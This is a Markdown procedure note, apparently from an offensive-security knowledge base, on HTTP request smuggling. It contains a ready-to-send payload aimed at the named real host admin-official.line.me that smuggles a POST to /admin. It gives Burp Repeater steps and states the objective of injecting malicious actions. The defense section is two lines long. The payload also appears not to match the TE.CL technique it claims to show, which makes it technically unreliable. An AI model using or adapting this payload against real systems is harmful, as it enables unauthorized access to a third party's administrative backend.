---
tags:
  - http-smuggling
  - exploitation
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/burp-repeater-smuggle]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: c640b85f-fec8-4580-a900-ded5d0c2b119
created_at: '2025-12-13T09:01:26.267Z'
updated_at: '2025-12-13T09:01:26.267Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft and Send Smuggled HTTP Request

## Summary

This procedure details crafting and sending an HTTP request that exploits smuggling vulnerabilities by manipulating headers to inject unauthorized requests past load balancers.

## Description

Focusing on TE.CL smuggling, this involves creating requests with conflicting Transfer-Encoding and Content-Length to confuse parsers. Applied to admin-official.line.me, it can lead to backend exposure. Prerequisites include a confirmed vulnerability and HTTP manipulation tools.

## Requirements
1. Confirmed smuggling vulnerability
2. Burp Suite or similar for request crafting
3. Target endpoint access

## Defense

- Use WAF rules to block chunked encoding mismatches
- Log and alert on suspicious request patterns

## Objectives
1. Successfully smuggle a request
2. Inject malicious actions
3. Validate exploitation without harm

## Instructions

### Step 1: Construct Smuggling Payload

**Context**: Build the request with chunked encoding to hide the smuggled part.

**Command** ([[commands/burp-repeater-smuggle]]):
```bash
POST / HTTP/1.1
Host: admin-official.line.me
Transfer-Encoding: chunked
Content-Length: 4

0

POST /admin HTTP/1.1
Host: admin-official.line.me
Content-Length: 0

```

> This payloads a secondary POST request; send via Burp Repeater.

### Step 2: Send and Verify

**Context**: Transmit the request and check for successful processing.

> Monitor responses for indicators of smuggling success, like backend-specific content.

## MITRE ATT&CK Mapping

### Tactics
- [[Execution]]

### Techniques
- [[Exploit Public-Facing Application]]

### Sub-Techniques

## Commands Used
- [[commands/burp-repeater-smuggle]]

## Tools Used
- [[tools/Burp-Suite]]

## Tags
- [[http-smuggling]]
- [[exploitation]]
